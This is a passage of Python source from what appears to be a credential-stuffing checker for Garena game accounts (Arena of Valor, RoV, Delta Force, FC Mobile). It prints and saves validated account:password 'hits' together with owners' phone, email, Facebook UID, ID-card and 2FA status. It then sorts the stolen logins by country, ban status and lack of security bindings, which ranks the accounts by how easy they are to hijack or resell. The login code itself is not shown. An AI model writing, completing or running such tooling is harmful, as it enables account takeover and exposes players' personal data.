        "CH": "SWITZERLAND",
        "SY": "SYRIAN ARAB REPUBLIC",
        "TW": "TAIWAN, PROVINCE OF CHINA",
        "TJ": "TAJIKISTAN",
        "TZ": "TANZANIA, UNITED REPUBLIC OF",
        "TH": "THAILAND",
        "TL": "TIMOR-LESTE",
        "TG": "TOGO",
        "TK": "TOKELAU",
        "TO": "TONGA",
        "TT": "TRINIDAD AND TOBAGO",
        "TN": "TUNISIA",
        "TR": "TURKEY",
        "TM": "TURKMENISTAN",
        "TC": "TURKS AND CAICOS ISLANDS",
        "TV": "TUVALU",
        "UG": "UGANDA",
        "UA": "UKRAINE",
        "AE": "UNITED ARAB EMIRATES",
        "GB": "UNITED KINGDOM",
        "US": "UNITED STATES",
        "UM": "UNITED STATES MINOR OUTLYING ISLANDS",
        "UY": "URUGUAY",
        "UZ": "UZBEKISTAN",
        "VU": "VANUATU",
        "VE": "VENEZUELA, BOLIVARIAN REPUBLIC OF",
        "VN": "VIET NAM",
        "VG": "VIRGIN ISLANDS, BRITISH",
        "VI": "VIRGIN ISLANDS, U.S.",
        "WF": "WALLIS AND FUTUNA",
        "EH": "WESTERN SAHARA",
        "YE": "YEMEN",
        "ZM": "ZAMBIA",
        "ZW": "ZIMBABWE",
        "84": "VIETNAM",
        "63": "PHILIPPINES",
        "66": "THAILAND",
        "62": "INDONESIA",
        "65": "SINGAPORE",
        "60": "MALAYSIA",
        "886": "TAIWAN",
        "91": "INDIA",
        "95": "MYANMAR",
        "855": "CAMBODIA",
        "856": "LAOS",
    }
    return mapping.get(code, code)


_ROMAN_MAP = {
    "1": "I", "2": "II", "3": "III", "4": "IV", "5": "V",
    "I": "I", "II": "II", "III": "III", "IV": "IV", "V": "V",
    "★": "I", "★★": "II", "★★★": "III", "★★★★": "IV", "★★★★★": "V",
}


def _format_rank(rank: str) -> str:
    if not rank:
        return ""
    s = str(rank).strip()
    low = s.lower()
    low = re.sub(r"\s+", " ", low).strip()

    def _tail(src, pattern):
        t = re.sub(pattern, "", src).strip()
        t = re.sub(r"\s+", " ", t).strip().upper()
        return _ROMAN_MAP.get(t, t)

    if "kim cương" in low or "kim cuong" in low or re.search(r"\bk\s*\.\s*c(?:uong|ương)\b", low):
        tail = _tail(low, r"kim\s*c(?:uong|ương)|k\s*\.\s*c(?:uong|ương)")
        return f"K.Cương {tail}".strip()
    if "tinh anh" in low or "tinh_anh" in low or "tinh-anh" in low or "tinhanh" in low or re.search(r"\bt\s*\.\s*anh\b", low):
        tail = _tail(low, r"tinh\s*anh|tinh_anh|tinh-anh|tinhanh|t\s*\.\s*anh")
        return f"T.Anh {tail}".strip()
    if "cao thủ" in low or "cao thu" in low:
        tail = re.sub(r"cao\s*thủ|cao\s*thu", "", low).strip()
        return f"Cao Thủ {tail}".strip()
    if "thách đấu" in low or "thach dau" in low:
        tail = re.sub(r"thách\s*đấu|thach\s*dau", "", low).strip()
        return f"Thách Đấu {tail}".strip()
    if "chiến tướng" in low or "chien tuong" in low:
        tail = re.sub(r"chiến\s*tướng|chien\s*tuong", "", low).strip()
        return f"Chiến Tướng {tail}".strip()
    if "bạch kim" in low or "bach kim" in low:
        tail = _tail(low, r"bạch\s*kim|bach\s*kim")
        return f"B.Kim {tail}".strip()
    if "bac" in low or "bạc" in low:
        tail = _tail(low, r"bạc|bac")
        return f"Bạc {tail}".strip()
    if "vàng" in low or "vang" in low:
        tail = _tail(low, r"vàng|vang")
        return f"Vàng {tail}".strip()
    if "đồng" in low or "dong" in low:
        tail = _tail(low, r"đồng|dong")
        return f"Đồng {tail}".strip()
    return s


def _rank_display(rank: str, stars: int = 0) -> str:
    """Format rank string for display (Roman numerals for tiered ranks, stars only for Cao Thu / Chien Tuong)."""
    if not rank:
        return rank
    disp = _format_rank(rank)
    low_r = disp.lower()

    # Cao Thủ / Chiến Tướng: hiển thị số sao
    if "cao th" in low_r or "chiến tướng" in low_r or "chien tuong" in low_r:
        if stars:
            disp_clean = re.sub(rf"\s+{stars}$", "", disp).strip()
            return f"{disp_clean} (★{stars})"
        return disp

    # Thách Đấu / Chiến Thần
    if "thách đấu" in low_r or "thach dau" in low_r or "chiến thần" in low_r or "chien than" in low_r:
        return disp

    # Các bậc có phân hạng La Mã: Tinh Anh, Kim Cương, Bạch Kim, Vàng, Bạc, Đồng
    disp_up = disp.upper()
    has_roman = any(disp_up.endswith(f" {r}") for r in ("V", "IV", "III", "II", "I"))
    if has_roman:
        return disp

    roman_by_num = {1: "I", 2: "II", 3: "III", 4: "IV", 5: "V"}
    if stars in roman_by_num:
        return f"{disp} {roman_by_num[stars]}"

    return disp


def _extract_master_stars(rank_raw: str) -> int:
    """Extract Master stars (1-50) from rank string."""
    if not rank_raw:
        return 0
    s = str(rank_raw).strip().lower()
    s = unicodedata.normalize("NFKD", s).encode("ascii", "ignore").decode("ascii")
    s = re.sub(r"[_\-]+", " ", s)
    if not re.search(r"cao\s*thu|\bmaster\b", s):
        return 0
    m = re.search(r"(?:cao\s*thu|master)\s*(\d{1,2})", s)
    if m:
        n = int(m.group(1))
        if 1 <= n <= 50:
            return n
    m2 = re.search(r"\b(\d{1,2})\b", s)
    if m2:
        n = int(m2.group(1))
        if 1 <= n <= 50:
            return n
    return 0


def _detect_rank_category(rank_raw: str) -> dict:
    """Classify rank string into normalized tier flags."""
    if not rank_raw:
        return {}
    s = rank_raw.lower()
    fold = unicodedata.normalize("NFKD", s).encode("ascii", "ignore").decode("ascii")
    norm = re.sub(r"[^a-z0-9\s]", " ", fold)
    norm = re.sub(r"\s+", " ", norm).strip()

    return {
        "dong": ("đồng" in s) or ("dong" in norm) or ("บรอนซ์" in s) or ("bronze" in s) or ("青銅" in s),
        "bac": ("bạc" in s) or ("bac" in norm) or ("ซิลเวอร์" in s) or ("silver" in s) or ("白銀" in s),
        "vang": ("vàng" in s) or ("vang" in norm) or ("โกลด์" in s) or ("gold" in s) or ("黃金" in s),
        "bach_kim": ("bạch kim" in s) or ("bach kim" in norm) or bool(re.search(r"\bb\s*\.\s*kim\b", s)) or ("แพลทินัม" in s) or ("platinum" in s) or ("鉑金" in s),
        "kim_cuong": ("kim cương" in s) or ("kim cuong" in norm) or bool(re.search(r"\bk\s*cuong\b", norm)) or bool(re.search(r"\bk\s*\.\s*cuong\b", s)) or ("ไดมอนด์" in s) or ("diamond" in s) or ("鑽石" in s),
        "tinh_anh": ("tinh anh" in norm) or bool(re.search(r"\bt\s*anh\b", norm)) or bool(re.search(r"\bt\s*\.\s*anh\b", s)) or ("คอมมานเดอร์" in s) or ("commander" in s) or ("星耀" in s),
        "chien_tuong": ("chiến tướng" in s) or ("chien tuong" in norm) or ("ซูพรีมคอนเควอร์เรอร์" in s) or ("supreme conqueror" in s) or ("璀璨傳說" in s),
        "chien_than": (
            ("chiến thần" in s) or ("chien than" in norm) or
            ("thách đấu" in s) or ("thach dau" in norm) or
            ("กลอเรียสรูเลอร์" in s) or ("glorious ruler" in s)
        ),
        "master": (
            ("cao thủ" in s) or ("cao thu" in s) or ("cao thu" in norm) or
            bool(re.search(r"\bmaster\b", norm)) or
            ("คอนเควอร์เรอร์" in s and "ซูพรีม" not in s) or
            ("conqueror" in s and "supreme" not in s) or
            ("戰場傳說" in s)
        ),
    }


def _print_hit_box(r: dict):
    """Print highlighted HIT box in the console with all key info."""
    sk = r.get("aov_skins") or {}
    sep = _c(C.CYAN, "─" * 62)
    top = _c(C.BG_GREEN + C.BOLD + C.WHITE, "  ✔  HIT FOUND  ✔  ".center(62))
    print(f"\n{top}")
    print(sep)

    def row(label: str, value: str, color: str = C.WHITE):
        lbl = _c(C.YELLOW, f"  ► {label:<18}")
        val = _c(color, value)
        print(f"{lbl}{val}")

    acc = r.get("account", "")
    pw = r.get("password", "")
    row("Account", f"{acc}:{pw}", C.CYAN + C.BOLD)
    row("UID", str(r.get("uid", "")))
    if r.get("nickname"):
        row("Nickname", r["nickname"], C.MAGENTA)
    if r.get("aov_name"):
        row("LQ Name", r["aov_name"], C.MAGENTA)

    ctry = (r.get("country") or "").strip()
    reg = (r.get("region") or "").strip()
    if ctry:
        row("Country", ctry, C.GREEN)
    if reg:
        row("Region", reg)

    # Phone
    _full_phone = (r.get("aov_prefill_mobile") or "").strip() or (r.get("fcmobile_prefill_mobile") or "").strip()
    _show_phone = _full_phone or (r.get("masked_phone") or "").strip()
    if _show_phone:
        mob_str = _c(C.GREEN, f"YES [{_show_phone}]")
    else:
        mob_str = _c(C.GREEN, "YES") if r.get("mobile_bound") else _c(C.RED, "NO")

    # Email
    masked_email = (r.get("masked_email") or "").strip()
    if masked_email:
        mail_str = _c(C.GREEN, f"YES [{masked_email}]")
    else:
        mail_str = _c(C.GREEN, "YES") if r.get("email_verified") or r.get("email_v") else _c(C.RED, "NO")

    # Facebook
    _fb_uid = (r.get("fb_uid") or r.get("fb_uid_login") or "").strip()
    fb_str = _c(C.GREEN, f"YES [{_fb_uid}]") if r.get("fb_linked") and _fb_uid else (
        _c(C.GREEN, "YES") if r.get("fb_linked") else _c(C.RED, "NO")
    )
    cccd_str = _c(C.GREEN, "YES") if (r.get("idcard") or "").replace("*", "") else _c(C.RED, "NO")
    auth_str = _c(C.GREEN, "YES") if (r.get("authenticator_enable") or r.get("two_step_verify")) else _c(C.RED, "NO")
    ban_raw = r.get("aov_banned", "NO")
    ban_str = _c(C.RED, "BAN") if _is_yes(ban_raw) else _c(C.GREEN, "OK")
    print(f"  {_c(C.YELLOW, '► Security          ')}SĐT:{mob_str}  Mail:{mail_str}  FB:{fb_str}  CCCD:{cccd_str}  2FA:{auth_str}  BAN:{ban_str}")

    shells = r.get("shells", 0)
    if shells:
        row("Sò", str(shells), C.YELLOW)
    _sess_ip = (r.get("last_session_ip") or "").strip()
    _sess_cc = (r.get("last_session_country") or "").strip()
    _sess_dt = (r.get("last_session_time") or "").strip()
    if _sess_ip:
        _sess_str = f"{_sess_ip} [{_sess_cc}]"
        if _sess_dt:
            _sess_str += f"  {_sess_dt}"
        row("IP Garena", _sess_str, C.GRAY)

    aov_rank = r.get("aov_rank", "")
    aov_lv = r.get("aov_level", 0)
    aov_reg = r.get("aov_reg_time", "")
    aov_server = r.get("aov_server", "")
    if aov_server:
        row("Server", aov_server, C.CYAN)
    if aov_rank:
        stars = int(r.get("aov_rank_stars") or 0) or _extract_master_stars(aov_rank)
        row("Rank", _rank_display(aov_rank, stars), C.MAGENTA)
    if aov_lv:
        row("Level", str(aov_lv))
    if aov_reg:
        row("Ngày đăng ký", aov_reg)

    if _is_yes(ban_raw):
        kt_player = r.get("_kt_player") or {}
        ban_info = kt_player.get("banInfo") or {}
        unban_ts = ban_info.get("unbanTime", 0)
        if unban_ts:
            try:
                unban_str = datetime.datetime.fromtimestamp(int(unban_ts)).strftime("%d/%m/%Y %H:%M")
                row("BAN đến", unban_str, C.RED)
            except Exception:
                pass
        ban_reason = (ban_info.get("reason") or "").strip()
        if ban_reason:
            row("Lý do BAN", ban_reason, C.RED)

    item_history = r.get("aov_item_history") or []
    if item_history:
        recent = item_history[:5]
        hist_parts = []
        for it in recent:
            ts = (it.get("createdAt") or "")[:10]
            extra = (it.get("extra") or it.get("source") or "?")[:20]
            cost = it.get("costStr") or ""
            hist_parts.append(f"{ts} {extra}({cost})" if cost else f"{ts} {extra}")
        row("Lịch sử mua", " | ".join(hist_parts), C.GRAY)

    total_sk = sk.get("total_skins", 0)
    total_chmp = sk.get("total_champs", 0)
    cp = sk.get("cp", 0)
    row("Skin/Champ", f"{total_sk} skins / {total_chmp} champs  QH={cp}", C.GREEN if total_sk else C.GRAY)

    for tier, label in (("sss", "SSS"), ("ss", "SS"), ("anime", "Anime"), ("other", "Other")):
        cnt = sk.get(tier, 0)
        if cnt:
            names = ", ".join(sk.get(f"{tier}_list", [])[:5])
            row(f"{label}({cnt})", names, C.CYAN)

    # RoV Thailand
    rov_name = (r.get("rov_name") or "").strip()
    rov_server = (r.get("rov_server") or "").strip()
    rov_sk = r.get("rov_skins") or {}
    if rov_name or rov_server or rov_sk:
        print(sep)
        if rov_name:
            row("RoV Name", rov_name, C.MAGENTA)
        if rov_server:
            row("RoV Server", rov_server, C.CYAN)
        rov_role_id = r.get("rov_role_id", 0)
        if rov_role_id:
            row("RoV Role ID", str(rov_role_id))
        if rov_sk:
            rov_total = rov_sk.get("total_skins", 0)
            rov_cp = rov_sk.get("cp", 0)
            row("RoV Skin/CP", f"{rov_total} skins  QH={rov_cp}", C.GREEN if rov_total else C.GRAY)
            for tier, lbl in (("sss", "SSS"), ("ss", "SS"), ("anime", "Anime"), ("other", "Other")):
                cnt = rov_sk.get(tier, 0)
                if cnt:
                    names = ", ".join(rov_sk.get(f"{tier}_list", [])[:4])
                    row(f"RoV {lbl}({cnt})", names, C.CYAN)

    # Delta Force
    df_name = (r.get("df_nickname") or "").strip()
    df_rank = (r.get("df_rank") or "").strip()
    df_level = r.get("df_level", 0)
    df_m = r.get("df_matches", 0)
    df_w = r.get("df_wins", 0)
    df_kd = r.get("df_kd", "")
    if df_name or df_rank or df_level:
        print(sep)
        row("DF Name", df_name or "?", C.MAGENTA)
        if df_rank:
            row("DF Rank", df_rank, C.CYAN)
        if df_level:
            row("DF Level", str(df_level))
        if df_m:
            wr = f"{df_w * 100 // df_m}%" if df_m else "0%"
            kd_s = f"  K/D={df_kd}" if df_kd else ""
            row("DF Matches", f"{df_m} ({df_w}W / {wr}){kd_s}", C.GREEN)
    elif r.get("delta_force"):
        df_info = r.get("delta_force") or {}
        df_err = df_info.get("df_intl_error") or df_info.get("df_cms_error") or df_info.get("df_api_error") or ""
        if df_err:
            row("Delta Force", f"[{df_err}]", C.GRAY)

    suspicious = int(r.get("suspicious", 0) or 0)
    if suspicious:
        row("!! Suspicious", str(suspicious), C.RED)
    garena_created = r.get("garena_created", "")
    if garena_created:
        row("Tạo GR", garena_created)
    ll = r.get("last_login", "")
    if ll:
        row("Đăng nhập", _fmt_last_login(ll), C.YELLOW)

    tinh_trang = _derive_tinh_trang(r)
    tt_color = C.GREEN if tinh_trang == "Acc Trắng" else (C.RED if "Full" in tinh_trang or "fetch fail" in tinh_trang else C.YELLOW)
    row("Tình Trạng", tinh_trang, tt_color)

    print(sep + "\n")


def _print_result(r: dict, verbose: bool = False, stats: dict = None):
    status = r["status"]
    acc = r["account"]
    pw = r["password"]

    stat_str = ""
    if stats is not None:
        done = stats.get("done", 0)
        total = stats.get("total", 0)
        hits = stats.get("hits", 0)
        inv = stats.get("invalid", 0)
        err = stats.get("error", 0)
        pct = f"{done * 100 // total}%" if total else "0%"
        stat_str = (
            _c(C.GRAY, f" [{done}/{total} {pct}  ") +
            _c(C.GREEN, f"HIT:{hits}") + _c(C.GRAY, " ") +
            _c(C.RED, f"DIE:{inv}") + _c(C.GRAY, " ") +
            _c(C.YELLOW, f"ERR:{err}") + _c(C.GRAY, "]")
        )

    if status == "HIT":
        _print_hit_box(r)
        if verbose and r.get("session_key"):
            print(_c(C.GRAY, f"  SessKey: {r['session_key']}"))
    elif status == "INVALID":
        print(_c(C.RED, "\n ✘ [DIE]") + _c(C.GRAY, f" {acc}:{pw}") + stat_str)
    elif status == "NOT_FOUND":
        detail = r.get("detail", "")
        if "EMAIL_NOT_EXIST" in detail or "result=105" in detail:
            reason = "Email chưa liên kết tài khoản Garena"
        else:
            reason = "Tài khoản không tồn tại trên Garena"
        print(_c(C.RED, "\n ✘ [NOT_FOUND]") + _c(C.GRAY, f" {acc} ({reason})") + stat_str)
    elif status == "BANNED":
        print(_c(C.RED, "\n ✘ [BANNED]") + _c(C.GRAY, f" {acc} (Tài khoản bị khóa)") + stat_str)
    elif status == "SEC_BANNED":
        print(_c(C.RED, "\n ✘ [SEC_BANNED]") + _c(C.GRAY, f" {acc} (Tài khoản bị khóa bảo mật)") + stat_str)
    elif status == "TIMEOUT":
        print(_c(C.YELLOW, "\n ⏱ [TIMEOUT]") + _c(C.GRAY, f" {acc}") + stat_str)
    elif status == "MISS":
        detail = r.get("detail", "")
        if not verbose and any(c in detail for c in ("result=101", "result=105", "result=174")):
            return
        print(_c(C.GRAY, "\n ! [MISS]") + _c(C.GRAY, f" {acc} {detail}") + stat_str)
    else:
        detail = r.get("detail", "")
        print(_c(C.YELLOW, f"\n ! [{status}]") + _c(C.GRAY, f" {acc} {detail}") + stat_str)


def _print_bulk_status(stats: dict, started_at: float):
    """Single-line bulk progress update."""
    done = stats.get("done", 0)
    total = stats.get("total", 0)
    hits = stats.get("hits", 0)
    inv = stats.get("invalid", 0)
    err = stats.get("error", 0)
    white_hits = stats.get("white_hits", 0)
    white_shells = stats.get("white_shells", 0)
    pct = f"{done * 100 // total}%" if total else "0%"
    elapsed = max(1.0, time.time() - started_at)
    cpm = int(done / elapsed * 60)
    line = (
        f"[{done}/{total}] {pct} | CPM:{cpm} | HIT:{hits} | DIE:{inv} | ERR:{err} | "
        f"WHITE:{white_hits} | SO_WHITE:{white_shells}"
    )
    sys.stdout.write(f"\r\033[K{line}")
    sys.stdout.flush()


def _format_hit_line(h: dict) -> str:
    """Format a HIT result line for saving."""
    sk = h.get("aov_skins", {})

    # Email
    masked_email = h.get("masked_email", "")
    email_v = h.get("email_v", 0)
    has_masked_email = bool(masked_email and masked_email.replace("*", "").replace("@", "").replace(".", ""))
    if has_masked_email:
        ok = bool(h.get("email_verified")) or bool(int(email_v or 0))
        email_str = f"Yes [{masked_email}] ({'ĐÃ XÁC THỰC' if ok else 'CHƯA XÁC THỰC'})"
    elif h.get("email_verified"):
        email_str = "Yes [ĐÃ XÁC THỰC]"
    else:
        email_str = "No"

    # Phone
    _prefill_phone = (h.get("aov_prefill_mobile") or "").strip() or (h.get("fcmobile_prefill_mobile") or "").strip()
    masked_phone = h.get("masked_phone", "")
    _best_phone = _prefill_phone or masked_phone
    if _best_phone:
        sdt_str = f"Yes [{_best_phone}]"
    elif h.get("mobile_bound"):
        sdt_str = "Yes"
    else:
        sdt_str = "No"

    pass_str = "Yes" if h.get("password_set") else "No"
    _fb_uid_f = (h.get("fb_uid") or "").strip()
    fb_str = f"YES [{_fb_uid_f}]" if h.get("fb_linked") and _fb_uid_f else ("YES" if h.get("fb_linked") else "NO")
    ban_str = "YES" if _is_yes(h.get("aov_banned", "NO")) else "NO"

    idcard = h.get("idcard", "")
    cccd_str = f"Yes [{idcard}]" if (idcard and idcard.replace("*", "")) else "No"

    auth_en = h.get("authenticator_enable", 0)
    two_step = h.get("two_step_verify", 0)
    authen_str = "Yes" if auth_en else ("Yes (2FA)" if two_step else "No")

    parts = [
        f"{h['account']}:{h['password']}",
        f"UID={h.get('uid', '')}",
    ]
    if h.get("nickname"):
        parts.append(h["nickname"])

    reg = (h.get("region", "VIETNAM") or "").strip()
    if reg.upper() == "VN":
        reg = "VIETNAM"
    parts.append(f"Region={reg if reg else 'VIETNAM'}")

    ctry = (h.get("country") or "").strip()
    if ctry:
        parts.append(f"Country={ctry}")

    parts.extend([
        f"Sò={h.get('shells', 0)}",
        f"Email={email_str}",
        f"SĐT={sdt_str}",
        f"Pass={pass_str}",
        f"FB={fb_str}",
        f"BAN={ban_str}",
    ])

    if h.get("last_login"):
        parts.append(f"Đ.nhập={h['last_login']}")
    if h.get("garena_created"):
        parts.append(f"Tạo GR={h['garena_created']}")
    if h.get("fb_link_time"):
        parts.append(f"FB_Linked={h['fb_link_time']}")

    sess_ip = (h.get("last_session_ip") or "").strip()
    if sess_ip:
        sess_cc = (h.get("last_session_country") or "").strip()
        sess_dt = (h.get("last_session_time") or "").strip()
        parts.append(f"GarenaIP={sess_ip}[{sess_cc}] {sess_dt}".strip())

    if h.get("aov_name"):
        parts.append(f"LQ={h['aov_name']}")
    if h.get("aov_server"):
        parts.append(f"Server={h['aov_server']}")

    aov_rank = h.get("aov_rank", "")
    _rank_stars = int(h.get("aov_rank_stars") or 0) or _extract_master_stars(aov_rank)
    parts.append(f"Rank={_rank_display(aov_rank, _rank_stars) if aov_rank else 'Chưa có'}")

    if h.get("aov_level", 0):
        parts.append(f"Lv={h['aov_level']}")
    if h.get("aov_reg_time"):
        parts.append(f"Ngày ĐK={h['aov_reg_time']}")

    parts.extend([
        f"Skin={sk.get('total_skins', 0)}",
        f"Tướng={sk.get('total_champs', 0)}",
        f"QH={sk.get('cp', 0)}",
        f"CCCD={cccd_str}",
        f"Authen={authen_str}",
    ])

    aov_prefill = (h.get("aov_prefill_mobile") or "").strip()
    if aov_prefill and "*" not in aov_prefill:
        parts.append(f"LQ_SDT={aov_prefill}")

    # RoV TH
    if (h.get("rov_name") or "").strip():
        parts.append(f"RoV={h['rov_name'].strip()}")
    if (h.get("rov_server") or "").strip():
        parts.append(f"RoV_Server={h['rov_server'].strip()}")
    rov_sk_h = h.get("rov_skins") or {}
    if rov_sk_h:
        parts.append(f"RoV_Skin={rov_sk_h.get('total_skins', 0)}")
        parts.append(f"RoV_QH={rov_sk_h.get('cp', 0)}")
        for tier, lbl in (("sss", "SSS"), ("ss", "SS")):
            cnt = rov_sk_h.get(tier, 0)
            if cnt:
                parts.append(f"RoV_{lbl}({cnt})={', '.join(rov_sk_h.get(f'{tier}_list', []))}")

    # Skins
    for tier, lbl in (("ss", "SS"), ("sss", "SSS"), ("anime", "Anime"), ("other", "Other")):
        cnt = sk.get(tier, 0)
        if cnt:
            parts.append(f"{lbl}({cnt})={', '.join(sk.get(f'{tier}_list', []))}")

    # Delta Force
    df_nick = (h.get("df_nickname") or "").strip()
    if df_nick:
        parts.append(f"DF={df_nick}")
        if h.get("df_rank"):
            parts.append(f"DF_Rank={h['df_rank']}")
        if h.get("df_level"):
            parts.append(f"DF_Lv={h['df_level']}")
        if h.get("df_matches"):
            parts.append(f"DF_Match={h['df_matches']}")

    if int(h.get("suspicious", 0) or 0):
        parts.append(f"Suspicious={h['suspicious']}")
    if h.get("init_ip"):
        parts.append(f"InitIP={h['init_ip']}")

    _lhist = h.get("login_history") or []
    if _lhist:
        _lh0 = _lhist[0]
        parts.append(f"LastIP={_lh0.get('ip', '')} [{_lh0.get('country', '')}] {_lh0.get('game', '')} {_lh0.get('time', '')}".strip())

    _sops = h.get("sensitive_ops") or []
    if _sops:
        _s0 = _sops[0]
        parts.append(f"SecOp={_s0.get('type', '')} {_s0.get('time', '')} {_s0.get('ip', '')}".strip())

    parts.append(f"Tình Trạng={_derive_tinh_trang(h)}")
    return " | ".join(parts)


def _format_fc_line(h: dict) -> str:
    u = h.get("fcmobile_user") or {}
    if not isinstance(u, dict):
        u = {}
    acc = str(h.get("account", "") or "")
    pw = str(h.get("password", "") or "")
    lv = u.get("level", u.get("lv", h.get("aov_level", 0)))
    ovr = u.get("ovr", "")
    role = u.get("role", 0)
    point = u.get("Point", u.get("point", 0))
    bal = u.get("balance", u.get("Balance", 0))
    r_tcn = u.get("rankTCN", "")
    r_ddc = u.get("rankDDC", "")
    r_dgl = u.get("rankDGL", "")
    token = u.get("token", 0)

    fb_str = "YES" if h.get("fb_linked") else "NO"
    cmnd_str = "YES" if (h.get("idcard") or "").strip().replace("*", "") else "NO"
    mail_ok = bool(h.get("email_verified")) or bool(int(h.get("email_v", 0) or 0))
    masked_email = (h.get("masked_email") or "").strip()
    if masked_email:
        mail_str = f"{masked_email} ({'ĐÃ XÁC THỰC' if mail_ok else 'CHƯA XÁC THỰC'})"
    else:
        mail_str = "YES" if mail_ok else "NO"
    sdt_str = "YES" if bool(h.get("mobile_bound")) else "NO"
    sdt_extra = " (Đổi được)" if sdt_str == "YES" and not (h.get("masked_phone") or "").strip() else ""
    auth_on = bool(int(h.get("authenticator_enable", 0) or 0)) or bool(int(h.get("two_step_verify", 0) or 0))
    auth_str = "BẬT" if auth_on else "TẮT"

    last_topup = h.get("topup_time", 0) or 0
    prefill_mobile = (h.get("fcmobile_prefill_mobile") or "").strip()
    return (
        f"{acc}|{pw}||"
        f"LV: {lv}|OVR: {ovr}|ROLE: {role}|POINT: {point}|BALANCE: {bal}|"
        f"RANK_TCN: {r_tcn}|RANK_DDC: {r_ddc}|RANK_DGL: {r_dgl}|TOKEN: {token}|"
        f"Fb: {fb_str}|CMND: {cmnd_str}|Mail:{mail_str}|SĐT: {sdt_str}{sdt_extra}|"
        f"LS NẠP:{last_topup}|TTAUTHEN:{auth_str}|FC_SDT: {prefill_mobile}"
    )


# ── File Saving & Storage ─────────────────────────────────────────────────────
def _save(filename: str, line: str, subdir: str = ""):
    base = os.path.join("res", subdir) if subdir else "res"
    os.makedirs(base, exist_ok=True)
    with _save_lock:
        with open(os.path.join(base, filename), "a", encoding="utf-8") as f:
            f.write(line if line.endswith("\n") else line + "\n")


def _save_target(filename: str, line: str, subdir: str = "", foreign_dir: str = ""):
    """Save to target file with foreign redirection if applicable."""
    if foreign_dir:
        if not subdir:
            _save(filename, line, subdir=foreign_dir)
        return
    _save(filename, line, subdir=subdir)


def _save_classified(stem: str, line: str, ctry: str, subdir: str, foreign_dir: str = "", extra_stems: tuple = ()):
    """Save classified hit line to standard and country-specific paths."""
    _save_target(f"{stem}.txt", line, foreign_dir=foreign_dir)
    if ctry != "UNKNOWN":
        _save_target(f"{stem}.txt", line, subdir=subdir, foreign_dir=foreign_dir)
    _save_target(f"{ctry}.txt", line, subdir=stem, foreign_dir=foreign_dir)

    for extra in extra_stems:
        _save_target(f"{extra}.txt", line, foreign_dir=foreign_dir)
        if ctry != "UNKNOWN":
            _save_target(f"{extra}.txt", line, subdir=subdir, foreign_dir=foreign_dir)
        _save_target(f"{ctry}.txt", line, subdir=extra, foreign_dir=foreign_dir)


def _save_tach_acc(acc_pw: str, status: str, r: dict, ctry: str, detail: str = ""):
    """Save failed/miss/error account categorized by shells and country."""
    try:
        so = int(r.get("shells", 0) or 0)
    except Exception:
        so = 0
    parts = [acc_pw, f"status={status}", f"so={so}", f"country={ctry}"]
    if detail:
        parts.append(f"detail={detail}")
    line = " | ".join(parts)

    _save("tach_acc.txt", line)
    if so > 0:
        _save("tach_acc_so.txt", line)
    if ctry != "UNKNOWN":
        _save(f"{ctry}.txt", line, subdir="tach_acc_country")
        if so > 0:
            _save(f"{ctry}.txt", line, subdir="tach_acc_so_country")


def _save_result(r: dict):
    """Save check result into categorized files in res/."""
    acc_pw = f"{r['account']}:{r['password']}"
    status = r.get("status", "")

    is_th = bool(r.get("is_th_rov"))
    is_tw = bool(r.get("is_tw_aov"))
    foreign_dir = "AOV_THAILAND" if is_th else ("AOV_TAIWAN" if is_tw else "")

    if status == "HIT":
        hit_line = _format_hit_line(r)

        ctry = (r.get("country") or "").strip().upper() or "UNKNOWN"
        ctry = re.sub(r"[^A-Z0-9_ -]+", "", ctry).strip().replace(" ", "_") or "UNKNOWN"
        subdir = os.path.join("country", ctry)

        tinh_trang = _derive_tinh_trang(r)

        # FC Mobile
        fc_user = r.get("fcmobile_user") or {}
        if isinstance(fc_user, dict) and fc_user.get("uid"):
            fc_line = _format_fc_line(r)
            _save_target("acc_fc.txt", fc_line, foreign_dir=foreign_dir)
            if ctry != "UNKNOWN":
                _save_target("acc_fc.txt", fc_line, subdir=subdir, foreign_dir=foreign_dir)
            _save_target(f"{ctry}.txt", fc_line, subdir="acc_fc", foreign_dir=foreign_dir)

            mail_ok = bool(r.get("email_verified")) or bool(int(r.get("email_v", 0) or 0))
            cmnd_ok = bool((r.get("idcard") or "").strip().replace("*", ""))
            fb_ok = bool(r.get("fb_linked"))
            auth_on = bool(int(r.get("authenticator_enable", 0) or 0)) or bool(int(r.get("two_step_verify", 0) or 0))
            phone_ok = bool(r.get("mobile_bound"))

            if not (mail_ok or cmnd_ok or fb_ok or auth_on or phone_ok):
                _save_target("acc_fc_trang_khong_fon.txt", fc_line, foreign_dir=foreign_dir)
                if ctry != "UNKNOWN":
                    _save_target("acc_fc_trang_khong_fon.txt", fc_line, subdir=subdir, foreign_dir=foreign_dir)
                _save_target(f"{ctry}.txt", fc_line, subdir="acc_fc_trang_khong_fon", foreign_dir=foreign_dir)

        # Delta Force
        df_data = r.get("delta_force") or {}
        if df_data.get("df_has_data"):
            df_n = r.get("df_nickname", "") or "?"
            df_lv = r.get("df_level", 0)
            df_rk = r.get("df_rank", "") or "?"
            df_mt = r.get("df_matches", 0)
            df_line = f"{acc_pw} | DF: {df_n} Lv{df_lv} Rank={df_rk} Matches={df_mt}"
            _save_target("acc_delta_force.txt", df_line, foreign_dir=foreign_dir)
            if ctry != "UNKNOWN":
                _save_target("acc_delta_force.txt", df_line, subdir=subdir, foreign_dir=foreign_dir)
            _save_target(f"{ctry}.txt", df_line, subdir="acc_delta_force", foreign_dir=foreign_dir)

        # Ban accounts
        if _is_yes(r.get("aov_banned", "NO")):
            ban_file = "acc_ban_trang.txt" if tinh_trang == "Acc Trắng" else "acc_ban_khong_trang.txt"
            _save_target(ban_file, hit_line, foreign_dir=foreign_dir)
            if ctry != "UNKNOWN":
                _save_target(ban_file, hit_line, subdir=subdir, foreign_dir=foreign_dir)
            return

        # Rank flags & low-tier level 10+
        rank_raw = (r.get("aov_rank") or "").strip()
        ranks = _detect_rank_category(rank_raw)
        try:
            aov_lv = int(r.get("aov_level", 0) or 0)
        except Exception:
            aov_lv = 0

        if aov_lv >= 10 and (ranks.get("dong") or ranks.get("bac") or ranks.get("vang") or ranks.get("bach_kim")):
            _save_classified("rank_dong_bac_vang_bach_kim_lv10_plus", hit_line, ctry, subdir, foreign_dir)

        # Acc Trắng classifications
        if tinh_trang == "Acc Trắng":
            sk_at = r.get("aov_skins") or {}
            try:
                sss_cnt = int(sk_at.get("sss", 0) or 0)
            except Exception:
                sss_cnt = 0
            if sss_cnt >= 1:
                _save_classified("acc_trang_sss_plus", hit_line, ctry, subdir, foreign_dir)
                return

            try:
                ss_cnt = int(sk_at.get("ss", 0) or 0)
            except Exception:
                ss_cnt = 0
